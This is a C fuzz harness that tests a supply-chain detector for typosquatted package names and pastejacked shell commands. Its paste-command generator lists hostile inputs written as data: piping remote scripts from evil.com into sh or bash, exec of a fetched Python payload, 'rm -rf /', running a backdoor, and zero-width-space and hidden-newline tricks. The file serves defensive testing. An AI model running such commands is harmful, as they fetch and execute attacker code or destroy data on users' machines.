/*
 * tests/hlse_supply_fuzz.c
 *
 * Fuzz harness for the supply-chain module:
 *   hlse_check_package(name, ecosystem) — typosquat detection
 *   hlse_check_paste(text)              — pastejacking detection
 *
 * Build (plain):
 *   gcc -O0 -g -Wall -Wextra -D_POSIX_C_SOURCE=200809L \
 *       -o tests/fuzz_supply \
 *       tests/hlse_supply_fuzz.c hlse_supply.c hlse_util.c -I. -lm
 * Build (ASan):
 *   gcc -O1 -g -Wall -Wextra -D_POSIX_C_SOURCE=200809L \
 *       -fsanitize=address,undefined \
 *       -o tests/fuzz_supply_asan \
 *       tests/hlse_supply_fuzz.c hlse_supply.c hlse_util.c -I. -lm
 *
 * Usage: ./tests/fuzz_supply [iterations] [seed]
 */

#define _POSIX_C_SOURCE 200809L

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <setjmp.h>
#include <time.h>
#include "../hlse_supply.h"

static jmp_buf crash_jmp;
static char    last_input[16384];
static size_t  last_input_len;

static void crash_handler(int sig) { (void)sig; longjmp(crash_jmp, 1); }

static unsigned long xorshift(unsigned long *s) {
    unsigned long x = *s;
    x ^= x << 13; x ^= x >> 7; x ^= x << 17;
    *s = x; return x;
}

/* ── Input generators ─────────────────────────────────────────────────── */

static size_t gen_random(char *buf, size_t cap, unsigned long *rng) {
    size_t len = xorshift(rng) % (cap - 1);
    size_t i;
    for (i = 0; i < len; i++) buf[i] = (char)(xorshift(rng) & 0xFF);
    buf[len] = '\0';
    return len;
}

/* Typosquat-style package names: swap, drop, insert, transpose chars */
static size_t gen_pkg_name(char *buf, size_t cap, unsigned long *rng) {
    static const char *bases[] = {
        "requests", "numpy", "pandas", "flask", "django",
        "express", "lodash", "react", "webpack", "axios",
        "serde", "tokio", "rand", "clap", "anyhow",
        "golang.org/x/net", "github.com/gin-gonic/gin",
        "reqeusts", "numppy", "pnadas", "flaskk",
        /* very long name */
        "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
        /* empty-like */
        ".", "-", "_", "",
        NULL
    };
    int n = 0; while (bases[n]) n++;
    const char *base = bases[xorshift(rng) % (unsigned long)n];
    size_t blen = strlen(base);
    if (blen >= cap) blen = cap - 1;
    memcpy(buf, base, blen);

    /* optionally apply a mutation */
    if (blen > 2) {
        int mutation = (int)(xorshift(rng) % 4);
        size_t pos = xorshift(rng) % blen;
        static const char alpha[] = "abcdefghijklmnopqrstuvwxyz0123456789-_";
        switch (mutation) {
        case 0: /* swap adjacent */
            if (pos + 1 < blen) { char t = buf[pos]; buf[pos] = buf[pos+1]; buf[pos+1] = t; }
            break;
        case 1: /* insert */
            if (blen + 1 < cap) {
                memmove(buf + pos + 1, buf + pos, blen - pos + 1);
                buf[pos] = alpha[xorshift(rng) % (sizeof(alpha) - 1)];
                blen++;
            }
            break;
        case 2: /* delete */
            memmove(buf + pos, buf + pos + 1, blen - pos);
            blen--;
            break;
        case 3: /* replace */
            buf[pos] = alpha[xorshift(rng) % (sizeof(alpha) - 1)];
            break;
        }
    }
    buf[blen] = '\0';
    return blen;
}

static size_t gen_paste_cmd(char *buf, size_t cap, unsigned long *rng) {
    static const char *cmds[] = {
        "curl -fsSL https://example.com/install.sh | bash",
        "curl -fsSL http://x.co/s | sudo sh",
        "wget -qO- example.com/setup | sh",
        "sudo apt-get install -y malware",
        "python -c 'import urllib; exec(urllib.urlopen(\"http://evil.com\").read())'",
        "chmod +x /tmp/backdoor && /tmp/backdoor &",
        "history -c; curl -s evil.com | bash",
        "rm -rf / --no-preserve-root",
        "curl http://evil.com | base64 -d | sh",
        "eval $(curl -s evil.com/payload)",
        "python3 -c \"import os; os.system('id')\"",
        /* with Unicode zero-width space (U+200B) trick */
        "curl \xe2\x80\x8b" "evil.com | sh",
        /* with hidden newline */
        "ls -la\ncurl evil.com | sh",
        /* normal safe command */
        "ls -la /home",
        "echo hello",
        "git clone https://github.com/example/repo.git",
        /* empty and whitespace */
        "", "   ", "\t\n",
        NULL
    };
    int n = 0; while (cmds[n]) n++;
    const char *cmd = cmds[xorshift(rng) % (unsigned long)n];
    size_t len = strlen(cmd);
    if (len >= cap) len = cap - 1;
    memcpy(buf, cmd, len);
    buf[len] = '\0';
    return len;
}

/* ── Main ─────────────────────────────────────────────────────────────── */

static const char *ECOSYSTEMS[] = { "pip", "npm", "cargo", "go", NULL, "unknown" };

typedef size_t (*gen_fn)(char *, size_t, unsigned long *);

int main(int argc, char **argv) {
    long iterations = (argc > 1) ? atol(argv[1]) : 100000;
    unsigned long seed = (argc > 2) ? (unsigned long)atol(argv[2]) : 0xC0FFEEUL;
    if (seed == 0) seed = (unsigned long)time(NULL);

    printf("HLSE Supply-Chain Fuzz Harness\n");
    printf("  iterations: %ld\n  seed:       0x%lx\n\n", iterations, seed);

    struct sigaction sa;
    sa.sa_handler = crash_handler;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = 0;
    sigaction(SIGSEGV, &sa, NULL);
    sigaction(SIGBUS,  &sa, NULL);
    sigaction(SIGFPE,  &sa, NULL);
    sigaction(SIGABRT, &sa, NULL);

    gen_fn generators[] = { gen_random, gen_pkg_name, gen_paste_cmd };
    const int n_gen = (int)(sizeof(generators) / sizeof(generators[0]));
    const char *gen_names[] = { "random bytes", "package name", "paste command" };

    long crashes = 0, out_of_range = 0, ok = 0;
    long stats[3] = {0, 0, 0};
    char buf[16384];
    unsigned long rng = seed;

    long i;
    for (i = 0; i < iterations; i++) {
        int g = (int)(xorshift(&rng) % (unsigned long)n_gen);
        size_t len = generators[g](buf, sizeof(buf), &rng);
        (void)len;
        stats[g]++;

        last_input_len = strlen(buf);
        if (last_input_len < sizeof(last_input))
            memcpy(last_input, buf, last_input_len + 1);

        if (setjmp(crash_jmp) == 0) {
            int score = -1;

            if (g == 0) {
                /* random bytes: exercise both entry points alternately */
                if (xorshift(&rng) % 2 == 0) {
                    int eco_idx = (int)(xorshift(&rng) % 6);
                    PackageVerdict pv = hlse_check_package(buf, ECOSYSTEMS[eco_idx]);
                    score = pv.score;
                } else {
                    PasteVerdict pv = hlse_check_paste(buf);
                    score = pv.score;
                }
            } else if (g == 1) {
                /* package name with random ecosystem */
                int eco_idx = (int)(xorshift(&rng) % 6);
                PackageVerdict pv = hlse_check_package(buf, ECOSYSTEMS[eco_idx]);
                score = pv.score;
            } else {
                /* paste command */
                PasteVerdict pv = hlse_check_paste(buf);
                score = pv.score;
            }

            if (score < 0 || score > 100) {
                out_of_range++;
                printf("  OUT OF RANGE [%d] gen=%s\n", score, gen_names[g]);
                if (out_of_range >= 5) {
                    printf("  Too many out-of-range scores, aborting.\n");
                    return 1;
                }
            } else {
                ok++;
            }
        } else {
            crashes++;
            printf("  CRASH on iter %ld, generator=%s, input_len=%zu\n",
                   i, gen_names[g], last_input_len);
            printf("  First 64 bytes: ");
            size_t k;
            for (k = 0; k < 64 && k < last_input_len; k++)
                printf("%02x", (unsigned char)last_input[k]);
            printf("\n");
            if (crashes >= 5) { printf("  Too many crashes, aborting.\n"); return 1; }
        }

        if (i > 0 && i % 10000 == 0)
            printf("  ... %ld iters, ok=%ld crashes=%ld oor=%ld\n",
                   i, ok, crashes, out_of_range);
    }

    printf("\n=== Fuzz results ===\n");
    printf("  total iterations:   %ld\n", iterations);
    printf("  ok (in range):      %ld (%.1f%%)\n", ok, 100.0 * ok / iterations);
    printf("  out-of-range score: %ld\n", out_of_range);
    printf("  crashes:            %ld\n", crashes);
    printf("\n  Generator distribution:\n");
    int gi;
    for (gi = 0; gi < n_gen; gi++)
        printf("    %-24s  %ld\n", gen_names[gi], stats[gi]);
    printf("\n");

    if (crashes > 0 || out_of_range > 0) { printf("FUZZ FAILED\n"); return 1; }
    printf("FUZZ PASSED\n");
    return 0;
}
